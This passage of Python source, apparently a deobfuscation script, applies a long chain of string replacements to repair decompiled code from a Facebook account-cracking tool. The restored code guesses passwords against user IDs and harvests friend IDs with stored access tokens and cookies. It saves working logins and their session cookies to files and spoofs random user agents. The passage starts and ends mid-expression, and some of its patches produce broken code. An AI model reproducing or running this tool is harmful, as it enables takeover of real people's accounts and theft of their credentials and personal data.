    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd]
ugen = [
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd,
    user_ahd]""","""ugen2 = [user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd]
ugen = [user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd,user_ahd]""").replace("""
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2, sy3)
        except:
            pass
        login_lagi334()
        except IOError:
        login_lagi334()""","""
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
            exit()
    except IOError:
        login_lagi334()""").replace("""        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token=' + tokenku[0], {
                'cookie': cok }, **('cookies',))
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2, sy3)
        finally:
            pass
        login_lagi334()
        IOError
        login_lagi334()""","""        
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
            lo = mark(li, style='red')
            sol().print(lo, style='cyan')
            exit()
    except IOError:
        login_lagi334()""").replace("""b = random.choice([
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])""","""b = random.choice(['7.0','8.1.0','9','10','11','12'])""").replace("""b = random.choice([
        '3',
        '4',
        '5',
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12',
        '13',
        '14',
        '15',
        '16',
        '17'])""","""b = random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])""").replace("""c = random.choice([
        'OPPO A57 Build/MMB29M; wv'])""","""c = random.choice(['OPPO A57 Build/MMB29M; wv'])""").replace("""d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])""","""d = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])""").replace("""f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])""","""f = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])""").replace("""asu = random.choice([
    m,
    O,
    h,
    u,
    b,
    MJ3,
    MJ2,
    MJ,
    AS2,
    AH2,
    B,
    WR,
    AS_F,
    AKH_T,
    AH_T,
    AB_KH,
    AZ_T,
    BN,
    SM,
    AS_T,
    AKH_F,
    AH_F,
    RS,
    AB_A,
    Z,
    p,
    b,
    kk,
    hh,
    x,
    Y,
    P,
    u,
    B,
    J,
    MJ4,
    p])""","""asu = random.choice([m,O,h,u,b,MJ3,MJ2,MJ,AS2,AH2,B,WR,AS_F,AKH_T,AH_T,AB_KH,AZ_T,BN,SM,AS_T,AKH_F,AH_F,RS,AB_A,Z,p,b,kk,hh,x,Y,P,u,B,J,MJ4,p])""").replace("""dic = {
    '12': 'December',
    '11': 'November',
    '10': 'October',
    '9': 'September',
    '8': 'August',
    '7': 'July',
    '6': 'June',
    '5': 'May',
    '4': 'April',
    '3': 'March',
    '2': 'February',
    '1': 'January' }""","""dic = {'12': 'December','11': 'November','10': 'October','9': 'September','8': 'August','7': 'July','6': 'June','5': 'May','4': 'April','3': 'March','2': 'February','1': 'January' }""").replace("""dic2 = {
    '12': 'Devember',
    '11': 'November',
    '10': 'October',
    '09': 'September',
    '08': 'August',
    '07': 'July',
    '06': 'June',
    '05': 'May',
    '04': 'April',
    '03': 'March',
    '02': 'February',
    '01': 'January' }""","""dic2 = {'12': 'Devember','11': 'November','10': 'October','09': 'September','08': 'August','07': 'July','06': 'June','05': 'May','04': 'April','03': 'March','02': 'February','01': 'January' }""").replace("""None(None, None, None)
    if not None:
        pass""","""""").replace("e = None","").replace("del e","").replace("""if not None:
            pass""","").replace("""bo = random.choice([
        m,
        k,
        h,
        b,
        u,
        x])""","""bo = random.choice([m,k,h,b,u,x])""").replace("""amr = rc([
        '😀',
        '😃',
        '😄',
        '😁',
        '😆',
        '😅',
        '🤣',
        '😂',
        '🙂',
        '🙃',
        '😉',
        '😊',
        '😇',
        '🥰',
        '😍',
        '🤩',
        '😘',
        '😗',
        '😚',
        '😙',
        '😋',
        '😛',
        '😜',
        '🤪',
        '😝',
        '🤑',
        '🤗',
        '🤭',
        '🤫',
        '🤔',
        '🤐',
        '🤨',
        '😐',
        '😑',
        '😶',
        '😏',
        '😒',
        '🙄',
        '😬',
        '🤥',
        '😌',
        '😔',
        '😪',
        '🤤',
        '😴',
        '😷',
        '🤒',
        '🤕',
        '🤢',
        '🤮',
        '🤧',
        '🥵',
        '🥶',
        '🥴',
        '😵',
        '🤯',
        '🤠',
        '🥳',
        '😎',
        '🤓',
        '🧐',
        '😕',
        '😟',
        '🙁',
        '☹️',
        '😮',
        '😯',
        '😲',
        '😳',
        '🥺',
        '😦',
        '😧',
        '😨',
        '😰',
        '😥',
        '😢',
        '😭',
        '😱',
        '😖',
        '😣',
        '😞',
        '😓',
        '😩',
        '😫',
        '🥱',
        '😤',
        '😡',
        '😠',
        '🤬',
        '😈',
        '👿',
        '💀',
        '☠️',
        '💩',
        '🤡',
        '👹',
        '👺',
        '👻',
        '👽',
        '👾',
        '🤖',
        '😺',
        '😸',
        '😹',
        '😻',
        '😼',
        '😽',
        '🙀',
        '😿',
        '😾',
        '🧡',
        '💛',
        '💚',
        '💙',
        '💜',
        '🖤',
        '🤍',
        '🤎',
        '❤️',
        '🧡',
        '💛',
        '💚',
        '💙',
        '💜',
        '🖤',
        '🤍',
        '🤎',
        '❣️',
        '💕',
        '💞',
        '💓',
        '💗',
        '💖',
        '💘',
        '💝',
        '💟',
        '❤️‍🔥',
        '❤️‍🩹',
        '❤️',
        '🚀',
        '🛸',
        '🌍',
        '🌎',
        '🌏',
        '💔',
        '✈️',
        '🦦',
        '🔥',
        '👌🏼',
        '👋🏼',
        '🌚',
        '🔞',
        '🙆‍♂️',
        '🤦‍♂️',
        '✨',
        '🗿',
        '👍🏼',
        '🚬'])""","""amr = rc(['😀','😃','😄','😁','😆','😅','🤣','😂','🙂','🙃','😉','😊','😇','🥰','😍','🤩','😘','😗','😚','😙','😋','😛','😜','🤪','😝','🤑','🤗','🤭','🤫','🤔','🤐','🤨','😐','😑','😶','😏','😒','🙄','😬','🤥','😌','😔','😪','🤤','😴','😷','🤒','🤕','🤢','🤮','🤧','🥵','🥶','🥴','😵','🤯','🤠','🥳','😎','🤓','🧐','😕','😟','🙁','☹️','😮','😯','😲','😳','🥺','😦','😧','😨','😰','😥','😢','😭','😱','😖','😣','😞','😓','😩','😫','🥱','😤','😡','😠','🤬','😈','👿','💀','☠️','💩','🤡','👹','👺','👻','👽','👾','🤖','😺','😸','😹','😻','😼','😽','🙀','😿','😾','🧡','💛','💚','💙','💜','🖤','🤍','🤎','❤️','🧡','💛','💚','💙','💜','🖤','🤍','🤎','❣️','💕','💞','💓','💗','💖','💘','💝','💟','❤️‍🔥','❤️‍🩹','❤️','🚀','🛸','🌍','🌎','🌏','💔','✈️','🦦','🔥','👌🏼','👋🏼','🌚','🔞','🙆‍♂️','🤦‍♂️','✨','🗿','👍🏼','🚬'])""").replace("""kuki = ';'.join((lambda .0: [ f'{key}={value}' for key, value in .0 ])(ses.cookies.get_dict().items()))""","""kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])""").replace("""game = (lambda .0: [ i.text for i in .0 ])(x.find_all('h3'))""","""game = [i.text for i in x.find_all("h3")]""").replace("""statusok1 = nel(statusok, 'green', **('style',))""","""statusok1 = nel(statusok, style='green')""").replace("""cetak(nel(statusok1, title='OK'))""","""cetak(nel(statusok1, 'OK', **('title',)))""").replace("""statuscp1 = nel(statuscp, 'red', **('style',))""","""statuscp1 = nel(statuscp, style='red')""").replace("""cetak(nel(statuscp1, 'SESI', **('title',)))""","""cetak(nel(statuscp1, title='SESI'))""").replace("""if __name__ == '__main__':
    
    try:
        os.system('git pull')
    except:
        pass
    
    try:
        os.mkdir('OK')
    except:
        pass
    
    try:
        os.mkdir('CP')
    except:
        pass
    
    try:
        os.mkdir('/sdcard/ALVINO-DUMP')
    except:
        pass
    
    try:
        os.system('touch .prox.txt')
    except:
        pass
    
    try:
        os.system('pkg install play-audio')
    except:
        pass
    
    try:
        os.system('clear')
    except:
        pass""","""if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass""").replace("""\n\n\n\n\n\n\n\n""","""""").replace("""def fak_xy(u):
    for e in u + '
':""","""def fak_xy(u):
    for e in u + '':""").replace("""        
    except:
        login_lagi334()
        requests.exceptions.ConnectionError
        li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
        lo = mark(li, 'red', **('style',))
        sol().print(lo, 'cyan', **('style',))
        exit()""","""        
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
            lo = mark(li, style='red')
            sol().print(lo, style='cyan')
            exit()
    except IOError:
        login_lagi334()""").replace("""def fak_xy(u):
    for e in u + '
':""","""def fak_xy(u):
    for e in u + '':""").replace("""        
    except:
        login_lagi334()
        requests.exceptions.ConnectionError
        li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
        lo = mark(li, 'red', **('style',))
        sol().print(lo, 'cyan', **('style',))
        exit()""","""        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
            lo = mark(li, style='red')
            sol().print(lo, style='cyan')
            exit()
    except IOError:
        login_lagi334()""").replace("""{
                'cookie': cok }, **('cookies',))""","""cookies={'cookie':cok})""").replace("""def fak_xy(u):
    for e in u + '
':""","""def fak_xy(u):
    for e in u + '':""").replace("""        except:
        
        
        try:
            print(e)
        except:""","""except:pass""").replace("""                
        except (KeyError,IOError):
                requests.exceptions.ConnectionError
                exit()""","""except:pass:""").replace("""                except:
                
                
                try:
                    print(e)
                    exit()
                except:""","""except Exception as e:""").replace("""def setting():""","""    except:pass
def setting():""").replace("""with tred(30, **('max_workers',)) as""","""with tred(max_workers=30) as""").replace("""open('CP/' + cpc, 'a').write(idf + '|' + pw + '
')""","""open('CP/' + cpc, 'a').write(idf + '|' + pw + '')""").replace("""open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '
')""","""open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '')""").replace("""print('
')""","""print('')""").replace("""print('
    %s[0m cookie invalid' % M)""","""print('%s[0m cookie invalid' % M)""").replace("""w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', {
        'cookie': 'noscript=1;' + kuki }, **('cookies',)).text
    sop = bs4.BeautifulSoup(w, 'html.parser')""","""w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text""").replace("""x = sop.find('form', 'post', **('method',))""","""x = sop.find("form",method="post")""").replace("""asu = random.choice([
            m,
            k,
            h,
            b,
            u])""","""asu = random.choice([m,k,h,b,u])""").replace("""b = random.choice([
        '5.0',
        '6.0',
        '7.0',
        '8.1.0',
        '9',
        '10',
        '11',
        '12'])""","""b = random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])""").replace("""c = random.choice([
        'RMX3396'])""","""c = random.choice(['RMX3396'])""").replace("""print('
    %s [0mcookie invalid' % M)""","""print('%s [0mcookie invalid' % M)""").replace("""w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', {
        'cookie': 'noscript=1;' + kuki }, **('cookies',)).text""","""w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text""").replace("""def login():
    
    try:""","""def login():
    try:""").replace("""def menu():
    
    try:""","""def menu():
    try:""").replace("""b = random.choice([
        '8.1.0',
        '9',
        '10',
        '11',
        '12',
        '13'])""","""b = random.choice(['8.1.0','9','10','11','12','13'])""").replace("""try:
    print(' ')
except:
    
    ""","""try:
    print(' ')
except Exception as e:""").replace("""def bot():
    
    try:""","""def bot():
    try:""").replace("""lambda .0: for i in .0:
""","").replace(""")(range""",""") for i in (range""").replace("""headers, {
        'cert_reqs': ssl.CERT_NONE }, **('header', 'sslopt'))""","""header=headers, sslopt={"cert_reqs": ssl.CERT_NONE})""").replace("""(500, **('max_workers',))""","""(max_workers=500)""").replace("""concurrent.futures as concurrent""","""concurrent.futures""").replace("""
executor.submit(create)
os.system('clear')""","""
while True:
    executor.submit(create)
    os.system('clear')""").replace("""return None""","").replace("error = None","").replace("continue","").replace("""import lzma
import zlib
import codecs
import base64""","").replace("""
# Encoding: utf-8
# Decode by Plya Team - DecodeX
# Copyright: Plya - Team
# Follow Us On Telegram [ @Plya_Team ]""","").replace("""b = random.choice([
        '2',
        '3',
        '4',
        '5',
        '5.2',
        '6',
        '6.0.1',
        '7',
        '8',
        '9',
        '10',
        '11',
        '11',
        '11.0.1',
        '12',
        '13'])""","""b = random.choice(['2','3','4','5','5.2','6','6.0.1','7','8','9','10','11','11','11.0.1','12','13'])""").replace("""e = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])""","""e = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])""").replace("""""","""""").replace("""g = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])""","""g = random.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])""").replace("""asu = random.choice([
    m,
    k,
    h,
    u,
    b])""","""asu = random.choice([m,k,h,u,b])""").replace("""dic = {
    '1': 'January',
    '2': 'February',
    '3': 'March',
    '4': 'April',
    '5': 'May',
    '6': 'June',
    '7': 'July',
    '8': 'August',
    '9': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'December' }
dic2 = {
    '01': 'January',
    '02': 'February',
    '03': 'March',
    '04': 'April',
    '05': 'May',
    '06': 'June',
    '07': 'July',
    '08': 'August',
    '09': 'September',
    '10': 'October',
    '11': 'November',
    '12': 'Devember' }""","""dic = {'1': 'January','2': 'February','3': 'March','4': 'April','5': 'May','6': 'June','7': 'July','8': 'August','9': 'September','10': 'October','11': 'November','12': 'December' }
dic2 = {'01': 'January','02': 'February','03': 'March','04': 'April','05': 'May','06': 'June','07': 'July','08': 'August','09': 'September','10': 'October','11': 'November','12': 'Devember' }""").replace("""random.choice([
        u,
        k,
        kk,
        b,
        h,
        hh])""","""random.choice([u,k,kk,b,h,hh])""").replace("""error = None""","").replace("""# Source Generated with Decompyle++
# File: Coder_Escanor.pyc (Python 3.9)""","""""").replace("""None(None, None, None)
            if not None:
                pass""","""""").replace("""except:
        
        ""","""except Exception as e:""").replace("\n\n\n\n","").replace("""{
                'cookie_by_dyno': cok }, **('cookies',))""","""cookie_by_dyno={'cookie':cok})""").replace("""'red', **('style',))""","""style='red')""").replace("""'cyan', **('style',))""","""style='cyan')""").replace("""        IOError
        DYN01778()""","""    except IOError:
        login_lagi334()""").replace("""        requests.exceptions.ConnectionError""","""except requests.exceptions.ConnectionError:""").replace("""try:
            print(e)
        except:""","""try:
            print(e)
        except Exception as e:""").replace("""try:
                    print(e)
                    exit()
                except:""","""try:
                    print(e)
                    exit()
                except Exception as e:""").replace("""kuki = ';'.join((lambda .0: [ '%s=%s' % (key, value) for key, value in .0 ])(ses.cookies.get_dict().items()))""","""kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])""").replace("""print('

')""","""print('')""").replace("""    except:
except requests.exceptions.ConnectionError:""","""    except:""").replace("""try:
                pass
            except:
                
                ""","""try:
                pass
            except Exception as e:""").replace("""try:
                print(e)
            except:
                
                ""","""try:
                print(e)
            except Exception as e:""").replace("""                (KeyError, IOError)""","""                    except (KeyError,IOError):""").replace("""except:
                print(f'{u}')
                
                print('[✘] No Internet connection ')
                exit()
                except (KeyError,IOError):
                
                print(f'[✘] Not Public  {u}')
                time.sleep(3)
                back()""","""                except:
                    print(f'{u}')
                    print('[✘] No Internet connection ')
                    
                    exit()
                    except (KeyError,IOError):
                    print(f'[✘] Not Public  {u}')
                    
                    time.sleep(3)
                    back()""").replace("""None(None, None, None)""","""""").replace("""koki = ';'.join((lambda .0: [ '%s=%s' % (key, value) for key, value in .0 ])(p.cookies.get_dict().items()))""","""kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])""").replace("""        if 'c_user' in ses.cookies.get_dict().keys():
            ok += 1
            coki = po.cookies.get_dict()
            kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])""","""            if 'c_user' in ses.cookies.get_dict().keys():
                ok += 1
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])""").replace("""        def crackfree(idf, pwv):""","""def crackfree(idf, pwv):""").replace("""        if 'c_user' in ses.cookies.get_dict().keys():
            ok += 1
            coki = po.cookies.get_dict()
            kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
            open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '')""","""            if 'c_user' in ses.cookies.get_dict().keys():
                ok += 1
                coki = po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '')""").replace("""except requests.exceptions.ConnectionError:
        time.sleep(3)""","""        except requests.exceptions.ConnectionError:
            time.sleep(3)""").replace("""        def jalan(keliling):""","""def jalan(keliling):""").replace("""+ '
':""","""+ '':""").replace("""s]
""","""s]'""").replace("""print('
%""","""print('%""").replace("""    def opsi():""","""def opsi():""").replace("""exit('
%""","""exit('%""").replace("""input('
%""","""input('%""").replace("""print('
 %s""","""print(' %s""").replace("""replace('
'""","""replace(''""").replace("""%s
'""","""%s'""") .replace("""if __name__ == '__main__':
    
    try:
        os.system('git pull')
    except:
        pass
    
    try:
        os.mkdir('OK')
    except:
        pass
    
    try:
        os.mkdir('CP')
    except:
        pass
    
    try:
        os.system('touch .prox.txt')
    except:
        pass""","""if __name__ == '__main__':
    try:os.system('git pull')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass""").replace("""if __name__ == '__main__':
    
    try:
        os.mkdir('OK')
    except Exception as e:
    
    try:
        os.mkdir('CP')
    except Exception as e:
    
    try:
        os.system('touch .prox.txt')
    except Exception as e:
    
    try:
        os.system('clear')
    except Exception as e:
    llogin()""","""if __name__ == '__main__':
    
    try:
        os.mkdir('OK')
    except:pass
    
    try:
        os.mkdir('CP')
    except:pass
    
    try:
        os.system('touch .prox.txt')
    except:pass
    
    try:
        os.system('clear')
    except:pass
    llogin()""").replace("""print(' 
 
 ')""","""print(' ')""").replace("""+ '
')""","""+ '')""").replace("""import lzma
import zlib
import codecs
import base64
def d(_, __):
    ___ = [chr((ord(char) - __) % 65536) for char in _]
    return ''.join(___)
print('')""","""""").replace("""def d(_, __):
    ___ = [chr((ord(char) - __) % 65536) for char in _]
    return ''.join(___)
print('')""","""""").replace("""    def menu(my_name, my_id):""","""def menu(my_name, my_id):""").replace("""headers_kai, datas_kai, **('headers', 'data')).text""","""headers=headers_kai, data=datas_kai).text""").replace("""print('
[""","""print('[""").replace("""
')""","""')""").replace("""        except:
        Ra_2005_log()
        IOError
        Ra_2005_log()""","""        except:
            Ra_2005_log()
    except IOError:
        Ra_2005_log()""").replace("""('
""","""('""").replace("""except:
                
                
                print('[>>] Total Id : ' + str(len(id)))""","""                except:
                
                
                    print('[>>] Total Id : ' + str(len(id)))
                    setting()""").replace("""                    (KeyError, IOError)""","""        except(KeyError, IOError):""").replace("""    def dump_massal():""","""def dump_massal():""").replace("""def dump_massal():
    try:
        token = open('.token.txt', 'r').read()
        cok = open('.cok.txt', 'r').read()
    except:
        exit()
    
    try:
        ""","""def dump_massal():
        try:
                token = open('.token.txt','r').read()
                cok = open('.cok.txt','r').read()
        except IOError:
                exit()
        try:
                """).replace("""    except:
        pass
        exit()
    if kumpulkan < 1 or kumpulkan > 100:
        exit()""","""        except ValueError:
                print('>> Masukkan Angka Anjing, Malah Huruff ')
                exit()
        if jum<1 or jum>100:
                print('>> Gagal Dump Idz ')
                exit()""").replace("""    ses = requests.Session()""","""        ses=requests.Session()""").replace("""        ses=requests.Session()
    ""","""        ses=requests.Session()
        """).replace("""0
    for""","""0
        for""").replace("""range(kumpulkan):
        ""","""range(kumpulkan):
            """).replace("""+= 1
        ""","""+= 1
            """).replace(""": ')
        uid.append""",""": ')
            uid.append""").replace("""    for user in uid:""","""        for user in uid:""").replace("""        for user in uid:
        
        try:
            head =""","""        for user in uid:
            try:
               head =""").replace("""        for user in uid:
        try:
            head =""","""        for user in uid:
            try:
               head =""").replace("""head ={
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 5.1; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Windows NT 6.2; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:46.0) Gecko/20100101 Firefox/46.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.120 Safari/537.36' }""","""head = (
               {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5','Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
               })""").replace("""            if len(id) == 0:
                params = {
                    'fields': 'friends',
                    'access_token': token }""","""               if len(id) == 0:
                   params = (
                   {
                   'access_token': token,
                   'fields': "friends"
                   }
               )""").replace("""            else:
                params = {
                    'fields': 'friends',
                    'access_token': token }
            url = requests.get('https://graph.facebook.com/{}'.format(user), params, head, {
                'cookies': cok }, **('params', 'headers', 'cookies')).json()
            for xr in url['friends']['data']:""","""               else:
                   params = (
                   {
                   'access_token': token,
                   'fields': "friends"
                   }
               )
               url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
               for xr in url['friends']['data']:""").replace("""               for xr in url['friends']['data']:
                
                try:
                    woy = xr['id'] + '|' + xr['name']
                    if woy in id:
                        pass
                    else:
                        id.append(woy)
                except:""","""               for xr in url['friends']['data']:
                   try:
                       woy = (xr['id']+'|'+xr['name'])
                       if woy in id:pass
                       else:id.append(woy)
                   except:continue""").replace("""                    (KeyError, IOError)""","""            except(KeyError, IOError):pass""").replace("""        except requests.exceptions.ConnectionError:
                exit()""","""            except requests.exceptions.ConnectionError:
                exit()""").replace("""except:
                print(f'')""","""except:
                    print(f'')""").replace("""        if 'c_user' in ses.cookies.get_dict().keys():""","""            if 'c_user' in ses.cookies.get_dict().keys():""").replace("""            headapp = {
                'user-agent': 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+' }""","""                headapp = {
                'user-agent': 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+' }""").replace("""        if 'ya' in taplikasi:
            ok += 1
            coki = po.cookies.get_dict()
            kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
            open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '')""","""            if 'ya' in taplikasi:
                ok += 1
                coki = po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '')""").replace("""            except:
                pass""","""            except Exception as e:""").replace("""    except requests.exceptions.ConnectionError:
            time.sleep(31)""","""        except requests.exceptions.ConnectionError:
            time.sleep(31)""").replace("""    if __name__=='__main__':""","""if __name__=='__main__':""").replace("""{
                    'cookie': cookie }, **('cookies',))""","""cookies={'cookie':cookie})""").replace("""    def create_file_login():""","""def create_file_login():""").replace("""(None, None, None)
            if not None:
                pass""","""""").replace("""        for met in range(jum):
        ""","""        for met in range(jum):
            """).replace("""Erorr = None""","""""").replace("""del Erorr""","""""").replace("""head1, **('headers',))""","""headers=head1)""").replace("""if not None:
                pass""","""""").replace("""        def checklist():""","""def checklist():""").replace("""data, **('headers', 'data'))""","""headers=headers, data=data)""").replace("""    def home():""","""def home():""").replace("""random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
